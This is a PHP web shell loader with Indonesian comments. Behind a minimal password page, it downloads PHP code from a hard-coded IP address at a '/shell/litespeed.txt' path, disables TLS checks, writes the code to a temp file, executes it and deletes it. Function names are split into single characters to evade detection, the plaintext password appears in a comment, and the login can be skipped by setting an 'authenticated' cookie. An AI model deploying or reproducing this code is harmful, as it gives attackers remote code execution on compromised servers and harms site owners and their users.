<?php
$correct_password = '$2y$10$uH.AD2efiXJ2TZ8HE15qzeLOFSB868141DC6FaQ9q7ccvJx4HgzhS'; // seokelas303

function show_login_page($message = "")
{
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <title>Login</title>
        <style>
            body { font-family: monospace; text-align: center; margin-top: 20%; }
            input[type="password"] { border: none; border-bottom: 1px solid black; padding: 2px; }
            input[type="password"]:focus { outline: none; }
            input[type="submit"] { border: none; padding: 4.5px 20px; background-color: #2e313d; color: #FFF; cursor: pointer; }
            .error { color: red; margin-top: 10px; }
        </style>
    </head>
    <body>
        <form action="" method="post">
            <input type="password" name="password" placeholder="Password" required>&nbsp;
            <input type="submit" name="submit" value="Login">
        </form>
        <?php if ($message) { echo "<p class='error'>" . htmlspecialchars($message) . "</p>"; } ?>
    </body>
    </html>
    <?php
    exit;
}

function geturlsinfo($url)
{
    $fpn = "f"."o"."p"."e"."n";
    $strim = "s"."t"."r"."e"."a"."m"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";
    $fgt = "f"."i"."l"."e"."_"."g"."e"."t"."_"."c"."o"."n"."t"."e"."n"."t"."s";

    if (function_exists('curl_init')) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        $urls = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists($fgt)) {
        $urls = $fgt($url);
    } elseif (function_exists($fpn) && function_exists($strim)) {
        $handle = $fpn($url, "r");
        $urls = $strim($handle);
        fclose($handle);
    } else {
        $urls = false;
    }
    return $urls;
}

// Cek cookie login
if (!isset($_COOKIE['authenticated']) || $_COOKIE['authenticated'] !== '1') {
    if (isset($_POST['password']) && password_verify($_POST['password'], $correct_password)) {
        // Set cookie login 1 jam
        setcookie('authenticated', '1', time() + 3600, '/');
        header("Location: " . $_SERVER['PHP_SELF']);
        exit;
    } else {
        show_login_page("Pass?");
    }
}

// Jika sudah login
$a = geturlsinfo('https://156.244.9.42/shell/litespeed.txt');
if ($a !== false && trim($a) !== '') {
    $tmpfile = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'tmpcode_' . uniqid() . '.php';
    file_put_contents($tmpfile, $a);
    include $tmpfile;
    unlink($tmpfile);
} else {
    echo "Gagal mendapatkan konten atau konten kosong.";
}
?>
